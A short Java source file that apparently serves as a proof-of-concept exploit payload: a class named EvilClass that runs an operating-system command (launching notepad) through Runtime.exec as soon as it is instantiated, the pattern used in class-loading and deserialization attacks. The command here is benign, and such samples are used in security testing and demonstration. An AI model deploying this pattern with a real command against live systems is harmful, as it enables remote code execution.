import java.io.IOException;

public class EvilClass extends ClassLoader {
    public EvilClass() throws IOException {
        Runtime.getRuntime().exec(new String[]{"notepad"});
    }
}
